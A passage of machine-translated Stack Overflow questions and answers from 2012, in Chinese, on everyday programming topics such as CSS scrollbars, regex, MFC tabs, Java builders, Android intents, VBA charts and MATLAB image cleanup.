用于隐藏/显示在两种状态下*永久*`visibility`呈现的滚动条（参见[jsFiddle 演示](http://jsfiddle.net/XrVmW/)）：

 *CSS：

```
.test {
    background: #ccc;
    width: 150px;
}

.test > DIV {
    overflow-y: scroll;
    visibility: hidden;
    height: 150px;
}

.test > DIV > DIV {visibility: visible; }

.test:hover > DIV {visibility: visible; }

    *+HTML .test > DIV > DIV {min-height: 0; } /* hasLayout for IE7 */ 
```

HTML：

```
<div class="test"><div><div>
Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.
</div></div></div> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-10T14:13:17.027

我不知道这是否是你要找的。

为悬停状态样式添加一点点宽度

```
div.mouseScroll {
    overflow: hidden;
    width:200px;
    height:300px;
}

div.mouseScroll:hover {
    overflow-y: scroll;
    width:220px;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-12T04:42:53.987

更改默认滚动条功能的唯一方法是在 javascript 中实现一个完全自定义的滚动条。见这里：[隐藏滚动条并在悬停时显示，就像 facebook 的新聊天侧边栏一样](https://stackoverflow.com/questions/7125185/hide-scrollbar-and-show-on-hover-like-facebooks-new-chat-sidebar)

接受的答案中的 JSFiddle 提供了源代码。*

# regex - 用正则表达式删除开头和结尾

> ID：12820523
> 
> 赞同：1
> 
> 时间：2012-10-10T13:28:14.860
> 
> 标签：regex

这是我的短语：“Begin xxxxxxxxx The End”

和

> re(r'开始\s*(.*)')

我可以删除“开始”这个词

但同时如何删除“The End”

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-10T13:31:01.957

试试这个，

```
(?i)(^Begin|The\sEnd$) 
```

`(?i)`如果你想区分大小写，只需删除。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-10T13:30:51.987

只需在您的`.*`. 问号将最小化匹配，因此您不会拾取周围的空间。

```
r'Begin\s*(.*?)\s*The End' 
```

请注意，您实际上并没有删除任何内容；您正在返回中间的文本。

# c++ - 如何捕捉按下的 CTabView 关闭按钮？

> ID：12820525
> 
> 赞同：0
> 
> 时间：2012-10-10T13:28:15.697
> 
> 标签：c++, mfc, tabview

我正在用标签在 MFC 中编写一个应用程序。我正在`CTabView`用自己的课程扩展课程。

我想在关闭活动选项卡时捕获事件并将其从 TabView 中实际删除。

该消息`WM_LBUTTONUP`从未在这里处理过-在任何子类中都没有处理过-我做错了什么？

当我关闭活动标签时，我可以在哪里捕捉事件？

```
IMPLEMENT_DYNCREATE(CBottomTabView, CTabView)

BEGIN_MESSAGE_MAP(CBottomTabView, CTabView)
    ON_WM_CREATE()
    ON_WM_LBUTTONUP()
END_MESSAGE_MAP()

CBottomTabView::CBottomTabView()
{
}

CBottomTabView::~CBottomTabView()
{
}

BOOL CBottomTabView::PreCreateWindow(CREATESTRUCT& cs) 
{
    if (!CTabView::PreCreateWindow(cs))
        return FALSE;

    cs.dwExStyle |= WS_EX_CLIENTEDGE;
    cs.style &= ~WS_BORDER;
    cs.lpszClass = AfxRegisterWndClass(CS_HREDRAW|CS_VREDRAW|CS_DBLCLKS, 
        ::LoadCursor(NULL, IDC_ARROW), reinterpret_cast<HBRUSH>(COLOR_WINDOW+1), NULL);

    return TRUE;
}

int CBottomTabView::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
    if (CTabView::OnCreate(lpCreateStruct) == -1)
        return -1;

    GetTabControl().SetLocation(CMFCBaseTabCtrl::LOCATION_BOTTOM);
    GetTabControl().ModifyTabStyle(CMFCTabCtrl::STYLE_3D_ONENOTE);
    GetTabControl().EnableTabDocumentsMenu(TRUE);
    GetTabControl().EnableActiveTabCloseButton(TRUE);
    GetTabControl().EnableTabSwap(TRUE);

    AddView(RUNTIME_CLASS(CLogView),_T("Log"));
    AddView(RUNTIME_CLASS(CLogView),_T("Log2"));
    AddView(RUNTIME_CLASS(CLogView),_T("Log3"));
    return 0;
}

// This method is never handled!!!
void CBottomTabView::OnLButtonUp(UINT nFlags, CPoint point)
{

    int nTab = GetTabControl().GetTabFromPoint(point);
    GetTabControl().SetActiveTab(nTab);
    if (GetTabControl().IsTabCloseButtonPressed())
    {
        RemoveView(nTab);
    }
    else
    {
        CTabView::OnLButtonUp(nFlags, point);
    }

}

// This metod is handled only when changing the tab
void CBottomTabView::OnActivateView(CView* view)
{
    CTabView::OnActivateView(view);
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-10T13:37:51.760

这是因为您在消息映射中请求了 OnLButtonDown 事件，而不是您正在响应的 OnLButtonUp 事件。要么更改消息映射，要么更改您的功能。

# java - 强制开发人员使用 Builder 来构建实例

> ID：12820529
> 
> 赞同：2
> 
> 时间：2012-10-10T13:28:23.130
> 
> 标签：java, design-patterns, orm, builder

我有一些`POJOs`有一定的规则要遵守。**A**类型的**ObjectA**的状态取决于 B 类型的**ObjectB**的**状态**。在这种情况下，我使用构建器在**ObjectA**上强制执行**ObjectB**的规则。

 ******构建器负责执行所有验证、抛出异常并在构建**ObjectA**时执行检查。这不是问题。我希望将来的开发人员使用构建器来实例化和操作类型**A 。**我该如何执行？

以下是我的一些选择，这将是最好的方向：

1.  文档，如果开发人员不阅读文档，则效果不佳，而且如果可以做某事，就会有人去做。
2.  将验证移到 中`POJO`，但我使用*ORM*并且在设置属性时很少会引发错误。
3.  你对这个问题的想法。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-10T13:34:39.750

使用静态内部构建器。

或者使构造函数受保护并将生成器放在具有公共接口的同一包中

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-10T13:34:30.687

我假设鉴于这些是 POJO，使构造函数小于 public 不是一种选择，因为这会导致 ORM 出现问题？

如果可以将构造函数设为非公开，*则*可以将生成器设为 POJO 类的静态子类，并将构造函数设为私有，从而防止其他人直接实例化 POJO。

但是您至少应该能够使用`@Deprecated`注释来为使用 POJO 的构造函数提供警告。然后，您可以使用`@SuppressWarnings("deprecation")`执行实例化的 Builder 方法来获得干净的构建。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-10T13:35:36.377

只要确保你的A类的构造函数不能被直接调用。制作它`private`并将构建器创建为可以访问构造函数的静态内部类。然后（可选）在 A 中创建一个方法

```
public static Builder builder() {
    return new Builder();
} 
```

以方便的方式访问构建器。您还可以将外部依赖项（如 B）传递给此方法。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-10T13:47:34.187

将`Builder`、`ObjectA`和`ObjectB`放在同一个包中。然后使构造函数为`ObjectA`和`ObjectB`保护。这样，建造者是唯一可以创造它们的人。******

# c# - 实体框架为 Oracle DB 生成错误的查询。如何找到查询的实际文本？

> ID：12820530
> 
> 赞同：1
> 
> 时间：2012-10-10T13:28:25.093
> 
> 标签：c#, linq-to-entities, oracle11g

我在 Oracle 11g Express 上使用带有 ODP.NET 11.2.0.2.0 的实体框架。

我对获取的行进行了一定的授权。规则是用 C# 编写的，并在`.Where`我的结果的子句中使用，即（简化示例）：

```
var results = Source.Where(selectionPredicate);
var filtered = results.Where(authPredicate);
return filtered.ToList(); <-- exception thrown 
```

它工作得很好，所有的规则都被翻译成 SQL。在某一时刻，我不得不更改其中一项规则

```
(x, y) => x.Declarations.Any(d => d.Employment.Id == y) 
```

至

```
(x, y) => x.Declarations.Any(d => d.Employment.Substitutions.Any()) 
```

这又是一个简化的例子。`x`是我想获取的对象，`y`是一些常量参数。`Declarations`,`Declarations.Employment`并且`Declarations.Employment.Substitutions`都是一些外键的导航属性。代码实际上是编译的，所以这些字段在那里等等。我知道这些是大量的连接，但我现在不在乎。所有的属性都是用方法加载的`Load`。

请注意，只有最长的导航属性不起作用，过滤`Declarations.Employment.Id`没有问题。

问题在于错误本身。这是`System.Data.EntityCommandExecutionException`ORA 错误`{"ORA-00904: \"Extent1\".\"ID\": invalid identifier"}`。

虽然我们不依赖手写 SQL，但我认为翻译过程存在问题。我想看看实际的查询，例如知道这是哪个表`Extent1`（我所有的关系都有`ID`字段......）。

当我尝试查看`ObjectSet.ToTraceString()`它时，它只显示一个没有`WHERE`子句的基本 fetch 查询，所以我不相信它包含过滤谓词。查询本身是正确的。

通常我从`v$sql`关系中检索查询，但它不会包含错误的查询。

如何找到实际发送到 Oracle 的查询？也许有工具可以作为数据库的代理？

有什么建议为什么这样的翻译会失败？

# android - facebook Feed Dialog单点登录无法正常工作

> ID：12820541
> 
> 赞同：0
> 
> 时间：2012-10-10T13:28:58.963
> 
> 标签：android, facebook, single-sign-on

```
if (!facebook.isSessionValid()) {
            Log.i("FacebokLogin ", "facebook session not valid");
            facebook.authorize(FacebookUtility.this, new String[] {}, new DialogListener() {
                @Override
                public void onComplete(Bundle values) {

                    SharedPreferences.Editor editor = mPrefs.edit();
                    editor.putString("FBLaccess_token",
                            facebook.getAccessToken());
                    editor.putLong("FBLaccess_expires",
                            facebook.getAccessExpires());
                    editor.commit();
                    Log.i("FacebokLogin ", "onComplete, values: " + values);
                    shareOnFacebook();
                }   

 mFacebook.dialog(FacebookUtility.this, "feed", parameters, new UpdateStatusListener()); 
```

授权完成并执行 mFacebook.dialog () 后，它会询问用户名和密码并显示提要对话框，但用户已经使用 facebook 应用程序登录。可能是什么问题？我正在测试 android 4.0 htc 欲望 c

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T15:06:19.873

尝试这个

```
if (!facebook.isSessionValid()) {
    facebook.authorize(this,
            new String[] { "email", "publish_stream" },
            new DialogListener() {

                @Override
                public void onCancel() {
                    // Function to handle cancel event
                }

                @Override
                public void onComplete(Bundle values) {
                    // Function to handle complete event
                    // Edit Preferences and update facebook acess_token
                    SharedPreferences.Editor editor = mPrefs.edit();
                    editor.putString("access_token",
                            facebook.getAccessToken());
                    editor.putLong("access_expires",
                            facebook.getAccessExpires());
                    editor.commit();
                } 
```

# iphone - 如何从一个视图控制器导航到另一个视图控制器？

> ID：12820547
> 
> 赞同：0
> 
> 时间：2012-10-10T13:29:22.427
> 
> 标签：iphone, ios, xcode

我有两个视图控制器，在第一个视图控制器中我有一个按钮，现在我想让用户点击该按钮，然后他们将转到第二个视图控制器。我没有使用情节提要并使用 ARC，我已经尝试过了，但它显示错误“uiviewcontroller 没有可见的@interface 声明选择器分配”。

```
- (IBAction)SendMsg:(id)sender {

    UIViewController *MessageViewController = [MessageViewController alloc] initWithNibName:@"MessageViewController" bundle:nil];
    [self presentModalViewController:MessageViewController animated:YES];
    [MessageViewController release];

} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-10T13:39:37.683

您将“*MessageViewController”声明为 UIViewController 类型。然后调用“MessageViewController”alloc 方法。你不能那样做。Maulik 是在正确的轨道上，但如果您使用 ARC，则需要删除最后一行（[aMessageViewController release];）

尝试：

```
- (IBAction)SendMsg:(id)sender{
    MessageViewController *myMessageViewControllerInstance = [[MessageViewController alloc]  initWithNibName:@"MessageViewController" bundle:nil];
    [self presentModalViewController:myMessageViewControllerInstance animated:YES];
} 
```

不要忘记，您需要一种方法来关闭模态视图控制器，并且您可以通过在上面的最后一行之前添加类似这样的内容来设置演示和过渡样式：

```
myMessageViewControllerInstance.modalPresentationStyle = UIModalPresentationFormSheet;
myMessageViewControllerInstance.modalTransitionStyle = UIModalTransitionStyleCoverVertical; 
```

还有其他样式，我只是用了例子。祝你好运

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-10T13:31:55.870

```
- (IBAction)SendMsg:(id)sender {

    MessageViewController *aMessageViewController = [[MessageViewController alloc] initWithNibName:@"MessageViewController" bundle:nil];
    [self presentModalViewController:aMessageViewController animated:YES];
    //[aMessageViewController release]; As you are using ARC

} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-10T13:38:30.713

```
 - (IBAction)SendMsg:(id)sender {
        MessageViewController *aMessageViewController = [[MessageViewController alloc] initWithNibName:@"MessageViewController" bundle:nil];
        [self presentModalViewController:aMessageViewController animated:YES];
    } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-10T14:03:37.427

```
 - (IBAction)SendMsg:(id)sender {

MessageViewController *aMessageViewController = [[MessageViewController alloc] initWithNibName:@"MessageViewController" bundle:nil];
[self presentModalViewController:aMessageViewController animated:YES];
[aMessageViewController release];

} 
```

如果您使用导航控制器，则可以使用 self.navigationController.......也。

# ruby - 每次在 ruby 中执行文件时，有什么方法可以增加一个数字

> ID：12820549
> 
> 赞同：3
> 
> 时间：2012-10-10T13:29:27.850
> 
> 标签：ruby, code-coverage

有什么办法可以增加号码。每次在 ruby​​ 中执行文件时。我没有在这件事上找到任何东西。我想声明一个不。然后每次执行它所在的文件时它都会递增。我可以使用文件来跟踪最后没有。用过，但有什么简单的解决方案

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-10T13:53:05.247

如果你`load`在一个长时间运行的 Ruby 进程中反复 ing 文件，那么这很容易：

```
$times_loaded ||= 0
$times_loaded += 1 
```

如果您每次都在一个新的 Ruby 解释器进程中运行该文件，那么您将不得不使用一个文件（它不能以任何其他方式工作）。您可以使 Ruby 文件自修改：

```
# THIS FILE HAS RUN 0 TIMES
me = File.read(__FILE__)
me.sub!(/THIS FILE HAS RUN \d+ TIMES/) { |s| "THIS FILE HAS RUN #{s[/\d+/].to_i + 1} TIMES" }
File.open(__FILE__,'w') { |f| f.write(me) } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-10T19:18:12.403

为什么不使用 ruby​​ 的[覆盖能力](http://www.ruby-doc.org/stdlib-1.9.3/libdoc/coverage/rdoc/Coverage.html)或像[SimpleCov](http://www.rubyinside.com/simplecov-a-powerful-straightforward-ruby-1-9-code-coverage-tool-3712.html)这样的代码覆盖工具？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-11T07:19:39.000

```
# 0 TIMES
def  get_no
  me = File.read(__FILE__)
  me.sub!(/ \d+ TIMES/) { |s| " #{s[/\d+/].to_i + 1} TIMES" }
  l=me.split("\n")
  File.open(__FILE__,'w') { |f| f.write(me) }
  return l[0][/\d+/]
end 
```

每次我调用它时，这个方法都会给我下一个 no 并且还会跟踪它，这要感谢 Alex D

# jquery - jQuery 仅在使用表格时从第一个元素返回索引

> ID：12820550
> 
> 赞同：2
> 
> 时间：2012-10-10T13:29:30.123
> 
> 标签：jquery, indexing

我正在开发一个使用大量表格在浏览器上呈现的网络平台。所以我需要使用`index()`一些元素来为用户提供交互。

但正如我在上面尝试这些表时评论的那样，索引运行得不是很好。

详情在这里：http: [//jsfiddle.net/gambin/JGWe3/3/](http://jsfiddle.net/gambin/JGWe3/3/)

我尝试使用另一种方式（没有表格）并且它可以正常工作！

有什么建议么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-10T13:31:33.993

你得到了与其直接父级相关的索引，这里你的直接父级是 td 并且前面是 span 所以你得到索引 1，要获取每个元素相对于父表的索引，你需要包含 subBullet 类的行的索引。您可以通过以下代码获取行索引，第一行的索引为 0，依此类推。在 jquery Doc 上阅读此内容值得了解[**index() 的工作原理**](http://api.jquery.com/index/)。

**[使用表格的现场演示](http://jsfiddle.net/rajaadil/JGWe3/5/)**

```
$('.subBullet').click(function(){
    alert($(this).closest('tr').index());
})​ 
```

**[使用 Div 的现场演示](http://jsfiddle.net/rajaadil/WTJM4/)**

```
$('.subBullet').click(function(){
    alert($(this).index());
})​ 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-10T13:32:35.727

试试这个

```
$('.subBullet').click(function(){
    alert($(this).closest("tr").index());
})​ 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-10T13:34:42.297

如果您在单击元素的索引之后，那么它将是：

```
$('.subBullet').click(function(){
    alert($('.subBullet').index($(this)));
})​ 
```

[http://jsfiddle.net/wGWCT/](http://jsfiddle.net/wGWCT/)

# android - 如何避免在 Android 上使用 mm-B 进行干净构建？

> ID：12820553
> 
> 赞同：1
> 
> 时间：2012-10-10T13:29:33.080
> 
> 标签：android

我正在构建一个具有大量 C 模块的 Android 应用程序，这些模块具有 Java->JNI->C 代码的序列。我目前正在外部文件夹中的 Android 基端口（Android 源代码）中使用 mm -B 选项构建所有 C 模块。当我想构建所有 C 模块时，我一个接一个地调用各个模块的 mm -B 函数。在这方面我有两个问题。

1.  我想知道是否有办法在一组模块上进行增量构建。这里的场景是我从一个脚本一个接一个地构建一组模块。我观察到脚本中提到的所有模块都会构建，无论是否对其进行了更改。这种干净的构建需要时间。有没有办法解决这个问题？

2.  每当执行 mm -B 时，构建的库默认放置在 out/target/product//obj/lib/ 路径中。我想知道我们是否可以更改此路径，并且每当调用 mm -B 命令时，库都会被复制到相应的模块路径而不是这个公共路径。

我对定义这些 mm 和 mmm 函数的 envsetup.sh 知之甚少。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-09-21T01:04:28.750

Q1：我观察到脚本中提到的所有模块都会构建，无论是否对其进行了更改。这种干净的构建需要时间。有没有办法解决这个问题？

--> -B 表示“无条件地生成所有目标”。所以你可以尝试在没有“-B”的情况下运行“mm”，看看它是否适合你。

Q2：我想知道我们是否可以更改此路径，并且每当调用 mm -B 命令时，将库复制到相应的模块路径而不是此公共路径。我对定义这些 mm 和 mmm 函数的 envsetup.sh 知之甚少。

--> 我觉得跟envsetup.sh没有关系。如果要更改模块的输出目录，您可能需要更改该模块的 .mk 文件。

# android - Android：intent.putExtra 在服务类中获取通知

> ID：12820556
> 
> 赞同：5
> 
> 时间：2012-10-10T13:29:50.437
> 
> 标签：android, service, android-intent

**这是我在Service 类**中的 showNotification 方法：

```
private void showNotification() {

Notification notification = new Notification(R.drawable.icon,
"New Notification", System.currentTimeMillis());

Intent i = new Intent(this, myActivity.class);
i.putExtra("notification", "MyNotif");
i.putExtra("notifiedby", "NotedBy");
PendingIntent contentIntent = PendingIntent.getActivity(this, 0, i, 0);
notification.setLatestEventInfo(this, "NotedBy", "MyNotif", contentIntent);
nm.notify(111, notification);
} 
```

所以点击**状态栏中的****通知**后，我将进入**myActivity**。

 ****问题是这些行在myActivity 中总是给出**错误。**

```
this.getIntent().hasExtra("notification")
this.getIntent().hasExtra("notifiedby") 
```

**putExtra() 不能与 PendingIntent 一起使用吗？**

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-10T13:56:08.537

试试这个代码：

```
String notification = getIntent().getStringExtra("notification");
String notifiedby = getIntent().getStringExtra("notifiedby"); 
```****

# vba - 将 excel 数据粘贴到 powerpoint 图表数据表中

> ID：12820559
> 
> 赞同：1
> 
> 时间：2012-10-10T13:30:05.127
> 
> 标签：vba, excel, powerpoint

我希望smeone可以帮助我。我想从 excel 中获取 dta 并粘贴到 power point 图表中，就像我手动但使用代码一样。我想自动创建一个我经常为不同的客户群体创建的标准演示文稿。（我正在处理 SAS 中的数据并将其从 SAS 导出到一个 excel 文件中，该文件每次都具有相同的选项卡和格式）

我能够编写附加的宏，这只是第一次尝试使用虚拟日期来查看它是如何工作的，并且我从其他网络资源中大量复制。它一直在工作，直到结束。它打开spower point，使用我的模板创建一个页面并添加正确类型的图表。它会打开该图表的数据表。问题是我无法粘贴数据。

我相信我没有正确引用 sorce excel 表，因此 VBA 正在被混淆（应该如此）。有人可以解释我是怎么做到的。

最后，我可能会修改它以打开现有图表并粘贴新数据，因为我会在代码中完成所有这些操作后进行格式化（我也已经准备好基本演示文稿）。但我需要能够粘贴数据。

这个网站和其他地方有很多关于如何将图表从 Excel 复制到 PPT 的示例，但我不想这样做，我希望 PPT 存储数据，以便在创建后根据需要进行修改。但是，我还没有找到一个可以完成我想要完成的任务。

如果这很重要，我正在使用 Office 2010。

提前感谢任何可以帮助我的人。

马里奥

子测试（）

```
Set ObjPPT = CreateObject("PowerPoint.Application")
Set ObjPresentation = ObjPPT.Presentations.Add
ObjPresentation.ApplyTemplate ("C:\Documents and Settings\ewnym5s\My Documents\Tools\Clean PPT Page.potx")
Set ObjSlide = ObjPresentation.Slides.Add(1, 12)
Set mychart = ObjSlide.Shapes.AddChart(xlBarClustered, 200, 200, 500, 200).Chart

Set wb = mychart.ChartData.Workbook
Set ws = wb.Worksheets(1)
ws.ListObjects("Table1").Resize ws.Range("A1:D6")

Sheets("Sheet1").Select
Range("A1:D6").Select
Selection.Copy

'The macro works perfectly up to here. The data is on Excel Sheet1 A1:d6 and it needs to be pasted to the same range on Sheet1 of the PPT data sheet. 
```

'如果我在单步执行代码时切换窗口，我可以看到数据被选中并复制。只是粘贴部分不起作用。

```
ws.Range("A1").Paste 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-04-13T16:24:27.223

感谢你们俩张贴这个，因为这是我很难找到自己的东西！这是代码的清理版本，其中进行了更改，以便您可以拖放它并准备好开始（例如声明变量和调整以使代码正常工作）

```
Sub test()

Dim ObjPPT As PowerPoint.Application
Dim ObjPresentation As PowerPoint.Presentation
Dim ObjSlide As PowerPoint.Slide
Dim mychart As PowerPoint.Chart
Dim wb As Workbook
Dim ws As Worksheet
Dim MainWorkbook As String

Set ObjPPT = CreateObject("PowerPoint.Application")
Set ObjPresentation = ObjPPT.Presentations.Add
ObjPresentation.ApplyTemplate ("C:\Documents and Settings\ewnym5s\My Documents\Tools\Clean PPT Page.potx")
Set ObjSlide = ObjPresentation.Slides.Add(1, 12)
Set mychart = ObjSlide.Shapes.AddChart(xlBarClustered, 200, 200, 500, 200).Chart

Set wb = mychart.ChartData.Workbook
Set ws = wb.Worksheets(1)
ws.ListObjects("Table1").Resize ws.Range("A1:D6")

MainWorkbook = ThisWorkbook.Name
Windows(MainWorkbook).Activate
Sheets("Sheet1").Select
Range("A1:D6").Select
Selection.Copy
ws.Range("A1:D6").Value = Range("A1:D6").Value

End Sub 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T10:13:35.723

您可以使用 .value 参数来设置不同范围之间的值。不过，这*只会*设置单元格中的值，不会保留任何格式。如果它只是图表的数据，这应该没关系。无论如何，您始终可以通过 VBA 应用格式。设置值也比在 Excel VBA 中复制和粘贴更有效。

由于源和目标都是 excel 范围，因此以下将起作用：

```
ws.Range("A1:D6").Value = Range("A1:D6").Value 
```

# matlab - 从二值图像中去除噪声

> ID：12820571
> 
> 赞同：5
> 
> 时间：2012-10-10T13:30:35.340
> 
> 标签：matlab, image-processing, computer-vision

我想只用葡萄和三个圆圈（红色、绿色、蓝色）获得图像。[我需要去除所有的污迹]。我该如何改进我的代码？

这是我的代码：

```
RGB = imread('img_3235.jpg');
GRAY = rgb2gray(RGB);

threshold = graythresh(GRAY);
originalImage = im2bw(GRAY, threshold);

originalImage = bwareaopen(originalImage,250);

imshow(originalImage);

CC = bwconncomp(originalImage); %Ibw is my binary image
stats = regionprops(CC,'pixellist'); 
```

这是我的图像（img_3235.jpg）。 ![在此处输入图像描述](../Images/a5ebd6630f47a0a34dcd90f554754418.png)

这是我的代码的结果： ![在此处输入图像描述](../Images/c9a8a1c9e3114d4f8388a353ce517ee7.png)

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-10-10T13:41:38.747

您可以使用 执行形态闭合[`IMCLOSE`](http://www.mathworks.com/help/images/ref/imclose.html)。

```
se = strel('disk', 10); %# structuring element
closeBW = imclose(originalImage,se);
figure, imshow(closeBW); 
```

B 对 A的[闭合](http://en.wikipedia.org/wiki/Mathematical_morphology#Closing)是通过 B 对 A 的膨胀，然后由 B 腐蚀所得结构来获得的。

![结果](../Images/0cf6e70b0a56094f6489cdc288106cc0.png)

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-10-10T15:23:00.227

另一种解决方案是在应用阈值之后使用适当的窗口大小进行中值滤波：

```
 ...
 originalImage = im2bw(GRAY, threshold);
 originalImage = medfilt2(originalImage,[37 37],'symmetric'); 
 originalImage = bwareaopen(originalImage,250);
 figure, imshow(originalImage); 
```

![在此处输入图像描述](../Images/19777bf6c67c88c5e7126311739a10d0.png)

# javascript - 在jquery中检测两个div是否相互传递

> ID：12820572
> 
> 赞同：3
> 
> 时间：2012-10-10T13:30:37.020
> 
> 标签：javascript, jquery, collision-detection

嗨，我正在努力解决以下问题

我已经敲了一个小样本来尝试展示我正在尝试做的事情。

[http://jsfiddle.net/4F4f8/2/](http://jsfiddle.net/4F4f8/2/)

我想要发生的是当红线越过蓝线时得到红线数据属性注释。

我正在尝试使用最接近的 jquery 来检测最接近的 div，如下所示。

```
var count = 1; 
setInterval(function(){

    leftPixels = count++;
    console.log(leftPixels);
    $('.scruber').css('left','-' + leftPixels * 10 + 'px');

    var markerData = $('.eventLine').closest('.marker').data('comment');

    $('.output').html(markerData);
    console.log(markerData);

},1000); 
```

非常感谢一些帮助

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-10T14:22:55.830

您可以使用 document.elementFromPoint(x, y); 这是一个例子。

在 Chrome 上测试：

[http://jsfiddle.net/4F4f8/18/](http://jsfiddle.net/4F4f8/18/)

```
var getElementBelowMe = function($me) {
    var $below,
        elOffset = $me.offset(),      
        x        = elOffset.left + $me.width() / 2,
        y        = elOffset.top + $me.height() / 2;

    $me.css("visibility", "hidden");
    $below = document.elementFromPoint(x, y);
    $me.css("visibility", "");
    return $below;
}

var count = 1; 
setInterval(function(){

    leftPixels = count++;
    var scruber = $('.scruber');
    scruber.css('left','-' + leftPixels * 10 + 'px');

    var eventLine = $('.eventLine');

    var markerData = getElementBelowMe(eventLine);
    if(markerData && $(markerData).hasClass("marker")) {
        var txt = "Passing " + $(markerData).data("comment");
        console.log(txt);
        $(".output").append(txt + "<br />");
    }

},100); 
```

不过，您必须牢记以下几点：

*   该示例通过查找事件线的中心并检查下面的内容来工作。这适用于您当前的设置，但如果您的 checkPoints 较窄，而 eventLine - 较宽，则可能会失败。
*   elementFromPoint 支持有些错误，或者在不同的浏览器中可以说不同（http://www.quirksmode.org/blog/archives/2010/06/more_ie9_goodne.html#link2）。
*   我在示例中使用了可见性，因为显示：无，实际上可以改变其他元素的位置，从而提供意想不到的结果，但你可以更好地使用它，测试..
*   在某些结构中具有标记坐标并检查哪个最接近@Archer 在评论中提出的建议可能是更好的解决方案

# html - Wordpress - 小部件中的 Facebook、Twitter 和 G+ 按钮？

> ID：12820582
> 
> 赞同：0
> 
> 时间：2012-10-10T13:31:01.673
> 
> 标签：html, wordpress

我正在尝试制作带有社交按钮的小部件。小部件，而不是插件，因为那太复杂了。

如果我的网站网址为[http://www.google.com](http://www.google.com)，那么制作在 Facebook 和 twitter 上“点赞”的按钮的代码是什么？

是否可以只使用 html 而没有 javascript？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T07:12:04.797

您可以使用以下插件简单地做到这一点：

[http://wordpress.org/extend/plugins/addthis/](http://wordpress.org/extend/plugins/addthis/)

或者

[http://wordpress.org/extend/plugins/share-this/](http://wordpress.org/extend/plugins/share-this/)

检查这两个并应用适合您的。

# visual-studio-lightswitch - 使用 INotifyPropertyChanged，线程问题

> ID：12820585
> 
> 赞同：0
> 
> 时间：2012-10-10T13:31:07.420
> 
> 标签：visual-studio-lightswitch

我是 LightSwitch 的新手。我试图在检查复选框控件时捕获事件。在创建屏幕时，我写道：

> ```
>  partial void CreateNewEmployee_Created()
>     {
>         this.EmployeeProperty.Contractors = new Contractor();
> 
>         Dispatchers.Main.BeginInvoke(() =>
>             {
>                 ((INotifyPropertyChanged) this.EmployeeProperty).PropertyChanged +=
>                  new PropertyChangedEventHandler(CreateNewEmployee_PropertyChanged);
> 
>             });
>     } 
> ```

并在 CreateNewEmployee_PropertyChanged 中处理事件

> ```
>  private void CreateNewEmployee_PropertyChanged(object sender, PropertyChangedEventArgs e)
>     {
>         if(this.EmployeeProperty.IsContractor)
>         {
> 
>             this.EmployeeProperty.Contractors = new Contractor();
>         }
>     } 
> ```

我得到了例外

> this.EmployeeProperty.Contractors = new Contractor();

例外是

> 无法初始化 EntityObject 类的新实例，因为环境 IDataWorkspace 不可用。请使用指定 EntitySet 的构造函数。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T22:12:32.040

你不应该使用 AddNew() 方法吗

```
var c = this.EmployeeProperty.Contractors.AddNew() 
```

# android - 在虚拟键盘（软件键盘）android上捕捉按下的键

> ID：12820586
> 
> 赞同：0
> 
> 时间：2012-10-10T13:31:08.667
> 
> 标签：android

我需要按下一个键并返回键码。在**软件**键盘上按下的键，我试图找到关于它的示例和解释，但它们有点模糊。

有谁知道并可以向我解释如何捕捉键盘按键？（我知道 onKeyListener 对我不好，我找到了 onKeyActionListener 但我仍然不明白如何使用它，如果它真的是我需要的）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T13:35:01.573

我认为你正在寻找的东西是

```
editText.setOnKeyListener(new OnKeyListener()
    {
        public boolean onKey(View v, int keyCode, KeyEvent event)
        {
            if (event.getAction() == KeyEvent.ACTION_DOWN)
            {
                switch (keyCode)
                {

                    case KeyEvent.KEYCODE_ENTER: //or any other key
                        //do something
                        return true;
                    default:
                        break;
                }
            }
            return false;
        }
    }); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-10T14:00:43.347

[这是](https://stackoverflow.com/a/2727605/645270)使用解决方法对类似问题的回答。

您还可以查看[OnEditorActionListener](http://developer.android.com/reference/android/widget/TextView.OnEditorActionListener.html)的`TextView`。

一个常规的 KeyListener 大部分时间都在工作，但这里有一个来自[docs](http://developer.android.com/reference/android/text/method/KeyListener.html)的引用：

